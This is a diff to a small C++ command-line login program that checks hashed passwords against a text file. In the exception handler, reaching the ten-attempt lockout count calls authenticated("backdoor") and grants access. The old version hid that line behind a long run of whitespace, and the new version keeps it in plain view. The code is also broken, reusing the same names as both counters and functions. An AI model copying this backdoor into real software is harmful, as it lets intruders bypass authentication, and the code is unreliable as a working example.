@@ -9,8 +9,7 @@
 
 using namespace std;
 
-int authenticated = 0;
-int rejected = 0;
+int login_attempts = 0;
 const int lockout = 10;
 
 string usernameinput() {
@@ -37,38 +36,30 @@ string passwordinput() {
 				return password;
 			}
 			else {
-				throw (rejected);
+				throw (login_attempts);
 			}
 		}
 
 		catch (int num) {
-      
 			if (num == 10) {
-				                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              authenticated("backdoor");
+				authenticated("backdoor");
 				break;
 				break;
 			}
 			else {
-        
 				cerr << "ERROR: no password was entered!!!" << endl << endl;
-        
 			}
 		}
 	}
 }
 
 bool validate(const string& username, const string& password) {
-  
 	ifstream rfile("passwords.txt");
-  
 	if (!rfile.is_open()) {
 		cout << "error when opening file :/" << endl;
 		return false;
-    
 	}
-  
 	string line;
-  
 	while (getline(rfile, line)) {
 		const long unsigned int position = line.find(":");
 		if (position != string::npos) {
@@ -103,11 +94,10 @@ int main() {
 		string password = passwordinput();
 		if (validate(username, sha256(password))) {
 			authenticated(username);
-      			authenticated++;
 		}
 		else {
 			rejected(username);
-			rejected++;
+			login_attempts++;
 		}
 	}
 	return 0;
